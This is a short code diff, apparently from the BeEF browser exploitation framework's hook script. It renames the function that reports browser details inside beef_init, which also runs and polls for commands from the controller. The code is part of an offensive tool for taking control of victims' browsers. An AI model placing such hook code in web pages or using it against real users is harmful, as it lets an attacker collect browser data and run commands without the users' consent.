@@ -16,7 +16,7 @@ window.onload = function() {
 function beef_init() {
   if (!beef.pageIsLoaded) {
     beef.pageIsLoaded = true;
-	beef.net.sendback_browser_details()
+	beef.net.browser_details()
     beef.updater.execute_commands();
     beef.updater.check();
   }
